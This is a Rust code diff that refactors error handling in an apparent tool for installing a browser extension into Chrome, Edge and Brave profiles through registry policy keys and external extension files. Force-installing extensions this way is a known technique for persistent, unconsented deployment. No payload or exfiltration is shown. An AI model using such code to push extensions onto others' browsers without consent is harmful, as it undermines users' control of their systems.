@@ -47,24 +47,30 @@ impl ExtensionInstaller {
     /// Instalar extensión en Chrome
     pub fn install_chrome(&self) -> Result<(), Box<dyn std::error::Error>> {
         println!("[+] Installing extension in Chrome...");
-        
-        // Ruta de preferencias de Chrome
-        let appdata = std::env::var("LOCALAPPDATA")?;
-        let chrome_path = PathBuf::from(appdata)
+        let appdata = std::env::var("LOCALAPPDATA");
+        if appdata.is_err() {
+            println!("[!] LOCALAPPDATA env var not found");
+            return Err("LOCALAPPDATA env var not found".into());
+        }
+        let chrome_path = PathBuf::from(appdata.unwrap())
             .join("Google")
             .join("Chrome")
             .join("User Data")
             .join("Default");
 
         if !chrome_path.exists() {
-            return Err("Chrome not found".into());
+            println!("[!] Chrome profile not found: {:?}", chrome_path);
+            return Err("Chrome profile not found".into());
         }
 
-        // Instalar via registry (política de grupo)
-        self.install_via_registry("Google\\Chrome", "Chrome")?;
-        
-        // También crear external_extensions.json
-        self.create_external_extension_file(&chrome_path, "Chrome")?;
+        if let Err(e) = self.install_via_registry("Google\\Chrome", "Chrome") {
+            println!("[!] Failed to create registry key for Chrome: {}", e);
+            return Err("Registry key creation failed".into());
+        }
+        if let Err(e) = self.create_external_extension_file(&chrome_path, "Chrome") {
+            println!("[!] Failed to create external extension file for Chrome: {}", e);
+            return Err("External extension file creation failed".into());
+        }
 
         println!("[+] Chrome installation complete");
         Ok(())
@@ -73,20 +79,30 @@ impl ExtensionInstaller {
     /// Instalar extensión en Edge
     pub fn install_edge(&self) -> Result<(), Box<dyn std::error::Error>> {
         println!("[+] Installing extension in Edge...");
-        
-        let appdata = std::env::var("LOCALAPPDATA")?;
-        let edge_path = PathBuf::from(appdata)
+        let appdata = std::env::var("LOCALAPPDATA");
+        if appdata.is_err() {
+            println!("[!] LOCALAPPDATA env var not found");
+            return Err("LOCALAPPDATA env var not found".into());
+        }
+        let edge_path = PathBuf::from(appdata.unwrap())
             .join("Microsoft")
             .join("Edge")
             .join("User Data")
             .join("Default");
 
         if !edge_path.exists() {
-            return Err("Edge not found".into());
+            println!("[!] Edge profile not found: {:?}", edge_path);
+            return Err("Edge profile not found".into());
         }
 
-        self.install_via_registry("Microsoft\\Edge", "Edge")?;
-        self.create_external_extension_file(&edge_path, "Edge")?;
+        if let Err(e) = self.install_via_registry("Microsoft\\Edge", "Edge") {
+            println!("[!] Failed to create registry key for Edge: {}", e);
+            return Err("Registry key creation failed".into());
+        }
+        if let Err(e) = self.create_external_extension_file(&edge_path, "Edge") {
+            println!("[!] Failed to create external extension file for Edge: {}", e);
+            return Err("External extension file creation failed".into());
+        }
 
         println!("[+] Edge installation complete");
         Ok(())
@@ -95,20 +111,30 @@ impl ExtensionInstaller {
     /// Instalar extensión en Brave
     pub fn install_brave(&self) -> Result<(), Box<dyn std::error::Error>> {
         println!("[+] Installing extension in Brave...");
-        
-        let appdata = std::env::var("LOCALAPPDATA")?;
-        let brave_path = PathBuf::from(appdata)
+        let appdata = std::env::var("LOCALAPPDATA");
+        if appdata.is_err() {
+            println!("[!] LOCALAPPDATA env var not found");
+            return Err("LOCALAPPDATA env var not found".into());
+        }
+        let brave_path = PathBuf::from(appdata.unwrap())
             .join("BraveSoftware")
             .join("Brave-Browser")
             .join("User Data")
             .join("Default");
 
         if !brave_path.exists() {
-            return Err("Brave not found".into());
+            println!("[!] Brave profile not found: {:?}", brave_path);
+            return Err("Brave profile not found".into());
         }
 
-        self.install_via_registry("BraveSoftware\\Brave", "Brave")?;
-        self.create_external_extension_file(&brave_path, "Brave")?;
+        if let Err(e) = self.install_via_registry("BraveSoftware\\Brave", "Brave") {
+            println!("[!] Failed to create registry key for Brave: {}", e);
+            return Err("Registry key creation failed".into());
+        }
+        if let Err(e) = self.create_external_extension_file(&brave_path, "Brave") {
+            println!("[!] Failed to create external extension file for Brave: {}", e);
+            return Err("External extension file creation failed".into());
+        }
 
         println!("[+] Brave installation complete");
         Ok(())
